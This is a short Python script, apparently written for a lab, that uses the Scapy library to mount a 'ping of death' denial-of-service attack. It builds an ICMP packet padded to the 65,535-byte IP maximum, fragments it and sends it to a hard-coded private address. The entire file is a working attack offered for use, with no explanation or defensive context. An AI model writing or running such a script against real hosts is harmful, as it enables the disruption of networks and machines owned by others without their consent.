from scapy.all import send
from scapy.layers.inet import IP, ICMP,fragment

def ping_of_death(target_ip):
    ip = IP(dst=target_ip)
    icmp = ICMP()

    ip_header_size = 20
    icmp_header_size = 8
    max_size = 65535
    payload_size = max_size - ip_header_size - icmp_header_size

    payload = b"A" * payload_size

    packet = ip / icmp / payload
    fragmented_packet = fragment(packet)

    send(fragmented_packet)


target_ip = "192.168.56.1"

ping_of_death(target_ip)
